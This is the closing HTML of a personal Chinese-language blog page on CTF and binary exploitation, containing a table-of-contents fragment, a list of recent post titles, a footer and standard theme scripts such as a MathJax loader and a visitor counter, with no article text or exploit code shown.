<span class="toc-text">Step 4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Step-5"><span class="toc-number">5.</span> <span class="toc-text">Step 5</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#exp"><span class="toc-number">6.</span> <span class="toc-text">exp</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/12/fmt_bss/" title="格式化字符串在bss段的利用">格式化字符串在bss段的利用</a><time datetime="2022-02-12T14:14:08.944Z" title="发表于 2022-02-12 22:14:08">2022-02-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/10/attack/" title="CSAPP之Attack LAB">CSAPP之Attack LAB</a><time datetime="2022-02-10T08:37:13.944Z" title="发表于 2022-02-10 16:37:13">2022-02-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/02/03/pwnkr/" title="Pwnable.kr Toddler's Bottle">Pwnable.kr Toddler's Bottle</a><time datetime="2022-02-03T03:23:43.370Z" title="发表于 2022-02-03 11:23:43">2022-02-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2022/01/27/bomb/" title="CSAPP之Bomb LAB">CSAPP之Bomb LAB</a><time datetime="2022-01-27T05:23:31.418Z" title="发表于 2022-01-27 13:23:31">2022-01-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2021/12/12/fmt/" title="Format String">Format String</a><time datetime="2021-12-12T14:15:50.183Z" title="发表于 2021-12-12 22:15:50">2021-12-12</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://tva1.sinaimg.cn/large/008i3skNgy1gy092h2rcrj31410u045d.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By Evylnk</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi,希望能够帮到你。</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
+  window.MathJax = {
+    tex: {
+      inlineMath: [ ['$','$'], ["\\(","\\)"]],
+      tags: 'ams'
+    },
+    chtml: {
+      scale: 1.2
+    },
+    options: {
+      renderActions: {
+        findScript: [10, doc => {
+          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
+            const display = !!node.type.match(/; *mode=display/)
+            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
+            const text = document.createTextNode('')
+            node.parentNode.replaceChild(text, node)
+            math.start = {node: text, delim: '', n: 0}
+            math.end = {node: text, delim: '', n: 0}
+            doc.math.push(math)
+          }
+        }, ''],
+        insertScript: [200, () => {
+          document.querySelectorAll('mjx-container:not\([display]\)').forEach(node => {
+            const target = node.parentNode
+            if (target.nodeName.toLowerCase() === 'li') {
+              target.parentNode.classList.add('has-jax')
+            } else {
+              target.classList.add('has-jax')
+            }
+          });
+        }, '', false]
+      }
+    }
+  }
+  
+  const script = document.createElement('script')
+  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
+  script.id = 'MathJax-script'
+  script.async = true
+  document.head.appendChild(script)
+} else {
+  MathJax.startup.document.state(0)
+  MathJax.texReset()
+  MathJax.typeset()
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="true" data-click="true"></script><script id="click-heart" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-heart.min.js" async="async" mobile="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
